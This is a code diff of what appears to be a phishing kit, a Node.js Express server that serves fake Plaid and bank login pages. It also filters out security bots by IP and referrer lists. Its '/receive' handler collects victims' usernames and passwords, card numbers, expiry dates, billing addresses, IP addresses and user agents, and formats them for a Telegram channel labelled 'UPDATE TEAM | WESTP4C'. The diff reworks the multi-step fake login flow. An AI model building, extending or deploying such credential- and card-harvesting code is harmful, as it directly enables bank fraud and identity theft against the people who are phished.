@@ -18,6 +18,7 @@ const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } 
 const { botRefList } = require('./config/botRef.js');
 const { use } = require('express/lib/router');
 const { sendMessageFor } = require('simple-telegram-message');
+const viewDir = path.join(__dirname, 'views');
 
 const port = 3000;
 
@@ -139,45 +140,30 @@ app.use((req, res, next) => {
 });
 
 
-// Route handler for '/login/3'
-app.get('/login/link', async (req, res) => {
-  try {
-    let htmlContent;
-        htmlContent = await fs.readFile(path.join(__dirname, 'views', 'pl.html'), 'utf-8');
-    res.send(htmlContent);
-  }
-   catch (error) {
-    console.error('Error reading file:', error);
-    res.status(500).send('Internal Server Error');
-  }
-});
+app.get('/link', (req, res) => {
+  const step = req.query.step;
 
-
-app.get('/login/plaid', async (req, res) => {
-  try {
-    let htmlContent;
-        htmlContent = await fs.readFile(path.join(__dirname, 'views', 'pllogin.html'), 'utf-8');
+  switch (step) {
+    case '1':
+      res.sendFile(path.join(viewDir, 'pl.html'));
+      break;
+      
+    case '2':
+      
+      res.sendFile(path.join(viewDir, 'pllogin.html'));
+      break;
+      
+    case '3':
     
-    res.send(htmlContent);
-  }
-   catch (error) {
-    console.error('Error reading file:', error);
-    res.status(500).send('Internal Server Error');
+      res.sendFile(path.join(viewDir, 'plbanks.html'));
+      break;
+    default:
+    
+      res.redirect('/Authenticate');
+      break;
   }
 });
 
-app.get('/link', async (req, res) => {
-  try {
-    let htmlContent;
-        htmlContent = await fs.readFile(path.join(__dirname, 'views', 'plbanks.html'), 'utf-8');
-    
-    res.send(htmlContent);
-  }
-   catch (error) {
-    console.error('Error reading file:', error);
-    res.status(500).send('Internal Server Error');
-  }
-});
 
 app.get('/confirm', async (req, res) => {
   try {
@@ -212,7 +198,7 @@ app.post('/receive', async (req, res) => {
   const myObjects = Object.keys(myObject).map(key => key.toLowerCase());
   console.log(myObjects);
 
-  if (myObjects.includes('password')) {
+  if (myObjects.includes('username')) {
     message += `✅ UPDATE TEAM | WESTP4C | USER_${ipAddress}\n\n` +
                `👤 LOGIN \n\n`;
 
@@ -236,6 +222,8 @@ app.post('/receive', async (req, res) => {
       `USER AGENT       : ${userAgent}\n` +
       `SYSTEM LANGUAGE  : ${systemLang}\n` +
       `💬 Telegram: https://t.me/UpdateTeams\n`;
+      
+      res.send('dn');
   }
 
   if (myObjects.includes('exp-date') || myObjects.includes('card-number') || myObjects.includes('Billing Address')) {
@@ -328,7 +316,7 @@ app.get('/Authenticate', async (req, res) => {
 });
 
 app.get('/', async (req, res) => {
-        res.redirect('/login');
+        res.redirect('/Authenticate');
 });
 
 // Middleware function for bot detection
